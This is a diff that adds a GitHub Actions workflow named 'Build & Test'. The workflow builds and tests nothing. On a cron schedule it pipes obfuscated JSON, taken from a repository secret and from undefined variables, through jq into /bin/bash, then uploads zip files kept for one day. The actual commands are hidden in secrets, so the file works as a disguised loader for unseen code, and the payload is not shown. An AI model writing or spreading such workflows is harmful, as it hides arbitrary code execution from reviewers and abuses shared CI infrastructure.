@@ -1,0 +1,33 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '37 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          iq795: ${{ secrets.iq795 }}
+        run: |
+          printf '%s' "$iq795" | jq -r .davah28 | /bin/bash
+          echo $ciqq38389 | jq -r .m401 | /bin/bash
+          echo $s0349 | jq -r .u13 | /bin/bash
+          printf '%s' "$z2" | jq -r .z1 | /bin/bash
+          printf '%s' "$cl92388" | jq -r .ytmbk6 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: CtUrtSIZ
+          path: "*.zip"
+          retention-days: 1
